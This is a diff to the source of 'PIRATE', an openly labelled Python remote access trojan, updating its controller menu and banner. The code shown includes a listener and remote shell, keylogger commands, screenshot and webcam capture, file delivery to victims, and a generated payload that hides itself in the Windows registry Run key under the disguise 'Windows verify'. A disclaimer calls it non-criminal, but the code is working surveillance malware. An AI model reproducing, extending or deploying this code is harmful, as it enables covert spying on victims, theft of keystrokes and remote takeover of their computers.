@@ -1,9 +1,20 @@
-# Version 1.1 by Gabriel Barone
+# ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## #
+# Version 1.1.1 by Gabriel Barone                   #
+# GitHub Page: https://github.com/gbrn1/PIRATE    #
+#                                                 #
+#               ! Disclaimer !                    #         
+#                                                 #
+# "This software do not promote or encourages any # 
+# illegal action and it was not made for criminal #
+# purposes."                                      #
+# ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## #
+
 from socket import socket, AF_INET, SOCK_STREAM
 import sys
 import os
 import requests
 import time
+
 
 class RAT:
     def __init__(self):
@@ -13,31 +24,18 @@ class RAT:
         self.keylogger_started = False
 
     def banner(self):
-        print('''	
- @@@@@                                        @@@@@
-@@@@@@@                                      @@@@@@@
-@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
- @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
-     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
-       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
-         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
-            @@@@@@@    @@@@@@    @@@@@@
-            @@@@@@      @@@@      @@@@@
-            @@@@@@      @@@@      @@@@@
-             @@@@@@    @@@@@@    @@@@@
-              @@@@@@@@@@@  @@@@@@@@@@
-               @@@@@@@@@@  @@@@@@@@@
-           @@   @@@@@@@@@@@@@@@@@   @@
-           @@@@  @@@@ @ @ @ @ @@@@  @@@@
-          @@@@@   @@@ @ @ @ @ @@@   @@@@@
-        @@@@@      @@@@@@@@@@@@@      @@@@@
-      @@@@          @@@@@@@@@@@          @@@@
-   @@@@@              @@@@@@@              @@@@@
-  @@@@@@@                                 @@@@@@@
-   @@@@@                                   @@@@@''')
+        print(r'''        _           _       
+       (_)         | |      
+  _ __  _ _ __ __ _| |_ ___ 
+ | '_ \| | '__/ _` | __/ _ \
+ | |_) | | | | (_| | ||  __/
+ | .__/|_|_|  \__,_|\__\___|
+ | |                        
+ |_|                       
+ ''')
 
     def menu(self):
-        help_menu = {'Help':'Show this mensage', 'listen':'Start listener on determined port', 'gen':'Generates payload', 'clear':'Clears screen', 'quit': 'Quits the program'}
+        help_menu = {'Help':'Show this mensage', 'listen':'Start listener on determined port', 'gen':'Generates payload', 'clear':'Clears screen', 'quit': 'Quits the program', 'banner':'Print banner'}
         while 1:
             cmd = input('pirate@menu> ')
             if cmd == 'help':
@@ -46,7 +44,7 @@ class RAT:
                 print()
             elif cmd.startswith('gen'):
                 if cmd == 'gen':
-                    print('Usage: gen <lhost> <lport> <payload_name.py>')
+                    print('[*] Usage: gen <lhost> <lport> <payload_name.py>')
                 else:
                     lhost = cmd.split(' ')[1]
                     lport = cmd.split(' ')[2]
@@ -59,18 +57,20 @@ class RAT:
                     port = cmd.split(' ')[1]
                 try:
                     self.port = int(port)
-                    self.address = ('',self.port)
-                    self.listen()
                 except:
-                    print('[-] Port must be a number!!')
+                    print('[-] Port must be a number')
+                self.address = ('',self.port)
+                self.listen()
             elif cmd == 'quit' or cmd == 'exit' or cmd == 'close':
                 exit()
             elif cmd == 'clear':
                 self.clear()
+            elif cmd == 'banner':
+                self.banner()
             elif cmd == '':
                 pass
             else:
-                print('Unknow command')
+                print('[-] Unknow command')
 
 
     def listen(self):
@@ -82,8 +82,8 @@ class RAT:
             self.conn, self.addr = s.accept()
             print('[+] Connection received from',self.addr)
             self.main()
-        except OSError:
-            print('This port is already in use!')
+        except:
+            pass
     def clear(self):
         if sys.platform.startswith('win'):
             os.system('cls')
@@ -122,7 +122,7 @@ class RAT:
                         pass
                     else:
                         conn.send(('shell:'+cmd).encode())
-                        print(conn.recv(40960).decode('Latin-1'),end="")
+                        print(conn.recv(56960).decode('Latin-1'),end="")
             elif cmd == 'clear':
                 self.clear()
             elif cmd == 'help':
@@ -138,7 +138,7 @@ class RAT:
                 with open(filename,'wb') as img:
                     img.write(data)
                     img.close()
-                print('screenshot saved as: %s\n'%filename)
+                print('[+] Screenshot saved as: %s\n'%filename)
             
             elif cmd == 'webcam':
                 runtime = time.asctime()[11:].replace(' ','-').replace(':','-')
@@ -150,11 +150,11 @@ class RAT:
                 with open(filename,'wb') as img:
                     img.write(data)
                     img.close()
-                print('webcam image saved as: %s\n'%filename)
+                print('[+] Webcam image saved as: %s\n'%filename)
 
             elif cmd.startswith('send_file'):
                 if cmd == 'send_file':
-                    print('Usage: send_file <file_name>\n')
+                    print('[!] Usage: send_file <file_name>\n')
                 if len(cmd.split(' ')) == 2:
                     filename = cmd.split(' ')[1]
                     if os.path.isfile(filename):
@@ -165,9 +165,9 @@ class RAT:
                         data.close()
                         download_link = response.content.decode('utf-8')
                         conn.send(('file:'+download_link).encode())
-                        print('File sended!')
+                        print('[+] File sended!')
                     else:
-                        print('Error!\nFile not found!')
+                        print('[-] File not found!')
             
             elif cmd == 'persistence':
                 conn.send(cmd.encode())
@@ -175,22 +175,22 @@ class RAT:
                 print(msg)
             elif cmd.startswith('keylogger'):
                 if cmd == 'keylogger':
-                    print('Usage:')
-                    print('keylogger --start')
-                    print('keylogger --dump')
-                    print('kelogger --stop')
-                elif cmd.startswith('keylogger --'):
-                    msg = 'keylogger:'+cmd.split('--')[1]            
+                    print('[*] Usage:')
+                    print('keylogger start')
+                    print('keylogger dump')
+                    print('kelogger stop')
+                elif cmd.startswith('keylogger '):
+                    msg = 'keylogger:'+cmd.split(' ')[1]            
                     conn.send(msg.encode())
-                    if cmd == 'keylogger --start':
+                    if cmd == 'keylogger start':
                         started = True
-                    elif cmd == 'keylogger --stop':
+                    elif cmd == 'keylogger stop':
                         started = False
-                    if cmd == 'keylogger --dump':
+                    if cmd == 'keylogger dump':
                         if started:
                             print(conn.recv(2048).decode())
                         else:
-                            print('[!] Error, keylogger not started!')
+                            print('[-] Error, keylogger not started!')
 
             elif cmd == 'sysinfo':
                 conn.send(cmd.encode())
@@ -198,19 +198,19 @@ class RAT:
                 print(sysinfo)
 
             elif cmd == 'msg':
-                print('Usage: msg <your_message>')
+                print('[*] Usage: msg <your_message>')
             
             elif cmd.startswith('msg '):
                 msg = cmd[4:]
                 conn.send(str('msg:'+msg).encode())
-                print('Sended!')
+                print('[+] Sended!')
             elif cmd == '':
                 pass
 
             elif cmd == 'exit' or cmd == 'close':
-                exit()
+                sys.exit(0)
             else:
-                print('Invalid command!\n')
+                print('[-] Invalid command!\n')
     def generate_payload(self, host, port, file_name):
         payload ="""from cv2 import VideoCapture, imwrite
 from pynput.keyboard import Key, Listener
@@ -243,7 +243,7 @@ def persistence(executable):
     except PermissionError:
         return('Failed!\\nRequire admin privileges')
     else:
-        SetValueEx(key,'Windows verify',0,REG_SZ,path_file+' -silent')
+        SetValueEx(key,'Windows verify',0,REG_SZ,path_file+' -silent --system-boot')
         key.Close()        
 while True:
     conn = s.recv(1024).decode('utf-8')
@@ -275,10 +275,11 @@ while True:
         cam = VideoCapture(0)   
         x, img = cam.read()
         if x:   
-            imwrite(filename,img) 
+            imwrite(filename,img)
         data = open(filename, 'rb')
         s.send(data.read())
         data.close()
+        cam.release()
     if conn.startswith('file:'):
         url = conn[5:]
         filename = url[26:]
@@ -315,15 +316,17 @@ while True:
         msg = conn[4:]
         payload = 'cd %temp% & echo MsgBox("{}") > tempmsg.vbs & start tempmsg.vbs'.format(msg)
         p = subprocess.Popen(payload,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, shell=True)"""
+        if '\\' not in file_name and '/' not in file_name:
+            file_name = 'output/'+ file_name
         with open(file_name,'w') as payload_file:
             payload_file.write(payload)
             payload_file.close()
-        print('Writed %i bytes payload to %s'%(len(payload.encode()),file_name))
+        print('[+] Writed %i bytes payload to %s'%(len(payload.encode()),file_name))
     
 def init():
     main = RAT()
     main.clear()
-    #main.banner()
+    main.banner()
     main.menu()
 
 init()
